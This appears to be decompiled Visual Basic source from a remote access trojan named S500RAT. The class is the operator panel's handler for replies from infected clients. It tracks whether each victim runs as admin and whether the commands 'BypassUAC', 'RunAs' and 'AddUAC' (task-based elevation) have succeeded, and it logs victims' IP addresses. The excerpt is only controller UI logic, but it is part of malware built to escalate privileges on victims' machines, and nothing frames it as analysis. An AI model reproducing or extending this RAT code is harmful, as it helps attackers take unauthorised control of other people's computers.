Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000040 RID: 64
	Public Class FrmAdmin
		' Token: 0x06001175 RID: 4469 RVA: 0x00096B08 File Offset: 0x00094D08
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formAdmin As FormAdmin = CType(Application.OpenForms("FormAdmin" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormAdmin)
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				If Operators.CompareString(asString, "setClient", False) <> 0 Then
					If Operators.CompareString(asString, "BypassUAC", False) <> 0 Then
						If Operators.CompareString(asString, "RunAs", False) <> 0 Then
							If Operators.CompareString(asString, "AddUAC", False) <> 0 Then
								If Operators.CompareString(asString, "Error", False) = 0 Then
									Dim flag As Boolean = formAdmin IsNot Nothing
									If flag Then
										formAdmin.StateAdmin.ForeColor = Color.Orange
										formAdmin.StateAdmin.Text = unpack_msgpack.ForcePathObject("Error").AsString
									End If
								End If
							Else
								Dim flag2 As Boolean = formAdmin IsNot Nothing
								If flag2 Then
									Dim flag3 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("AddUAC").AsString, "Yes", False) = 0
									If flag3 Then
										formAdmin.AddUAC.Enabled = False
										formAdmin.ExcuteUAC.Enabled = True
									Else
										Dim flag4 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("AddUAC").AsString, "YesAdmin", False) = 0
										If flag4 Then
											formAdmin.AddUAC.Enabled = True
											formAdmin.ExcuteUAC.Enabled = False
										Else
											Dim flag5 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("AddUAC").AsString, "NoAdmin", False) = 0
											If flag5 Then
												formAdmin.AddUAC.Enabled = False
												formAdmin.ExcuteUAC.Enabled = False
											Else
												Dim flag6 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("AddUAC").AsString, "No", False) = 0
												If flag6 Then
													formAdmin.AddUAC.Enabled = True
													formAdmin.ExcuteUAC.Enabled = False
													formAdmin.StateAdmin.ForeColor = Color.Red
													formAdmin.StateAdmin.Text = "task adding failed..."
												Else
													Dim flag7 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("AddUAC").AsString, "State", False) = 0
													If flag7 Then
														formAdmin.StateAdmin.ForeColor = Color.LawnGreen
														formAdmin.StateAdmin.Text = "task has been added successfully"
													End If
												End If
											End If
										End If
									End If
								End If
							End If
						Else
							Dim flag8 As Boolean = formAdmin IsNot Nothing
							If flag8 Then
								Dim flag9 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("RunAs").AsString, "Yes", False) = 0
								If flag9 Then
									formAdmin.RunAsadminstartor.Enabled = False
								Else
									formAdmin.RunAsadminstartor.Enabled = True
								End If
							End If
						End If
					Else
						Dim flag10 As Boolean = formAdmin IsNot Nothing
						If flag10 Then
							Dim flag11 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("BypassUAC").AsString, "Yes", False) = 0
							If flag11 Then
								formAdmin.BypassUAC.Enabled = False
							Else
								formAdmin.BypassUAC.Enabled = True
							End If
						End If
					End If
				Else
					Dim flag12 As Boolean = formAdmin IsNot Nothing
					If flag12 Then
						Dim flag13 As Boolean = formAdmin.Client Is Nothing
						If flag13 Then
							formAdmin.Client = client
							formAdmin.Timer1.Enabled = True
							Dim flag14 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Admin").AsString)
							If flag14 Then
								formAdmin.AdminInfo.Text = "Admin :  Yes"
								formAdmin.AdminInfo.ForeColor = Color.LawnGreen
							Else
								formAdmin.AdminInfo.Text = "Admin :  No"
								formAdmin.AdminInfo.ForeColor = Color.Red
							End If
						End If
					End If
				End If
			Catch ex As Exception
				ListLogs.AddArray("Admin " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
